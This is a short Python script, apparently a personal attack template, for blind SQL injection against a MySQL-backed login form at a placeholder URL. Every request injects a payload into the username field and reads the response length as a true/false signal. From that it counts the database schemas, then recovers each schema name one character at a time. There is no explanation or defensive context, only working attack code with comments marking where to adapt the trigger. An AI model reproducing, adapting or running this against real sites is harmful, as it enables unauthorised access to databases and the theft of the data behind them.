# MYSQL - Blind sqli
    # Get get all schemas

from requests import post
from string import ascii_letters, digits

class Attack:
    URL: str = 'https://vuln/login.php'

    def __init__(self) -> None:
        total_schema = self.get_total_schema()
        self.get_schemas(total_schema)

    def get_total_schema(self) -> int:
        for _ in range(1, 20):
            p = {"username": f"admin' and (SELECT COUNT(*)={_} total_schemas FROM information_schema.SCHEMATA)#", "password": "<ignore>"}
            resp = post(self.URL, data=p)
            print(_, len(resp.text))
            # your trigger logic
            if len(resp.text) > 2000:
                print(f'len(total_schema)={_}')
                return _
    
    def get_schema_length(self, index: int) -> int:
        for name_length in range(1, 100):
            p = {"username": f"admin' and (SELECT LENGTH((SELECT SCHEMA_NAME FROM information_schema.SCHEMATA ORDER BY SCHEMA_NAME LIMIT 1 OFFSET {index}))={name_length})#", "password": "<ignore>"}
            resp = post(self.URL, data=p)
            print(name_length, len(resp.text))
            # your trigger logic
            if len(resp.text) > 2000:
                print(f'len(schema[{index}])={name_length}')
                return name_length


    def get_schemas(self, n: int) -> None:
        for schema_index in range(n):
            name_length = self.get_schema_length(schema_index)
            schema = ''
            for name_index in range(1, name_length+1):
                for guess in ascii_letters + digits:
                    p = {"username": f"admin' and (SELECT ASCII(SUBSTRING((SELECT SCHEMA_NAME FROM information_schema.SCHEMATA ORDER BY SCHEMA_NAME LIMIT 1 OFFSET {schema_index}),{name_index},1))={ord(guess)})#", "password": "<ignore>"}
                    resp = post(self.URL, data=p)
                    print(guess, len(resp.text))
                    # your trigger logic
                    if len(resp.text) > 2000:
                        schema += guess
                        print(f'schema[{schema_index}][{name_index}/{name_length}]={schema}')
                        break

if __name__ == '__main__':
    Attack()
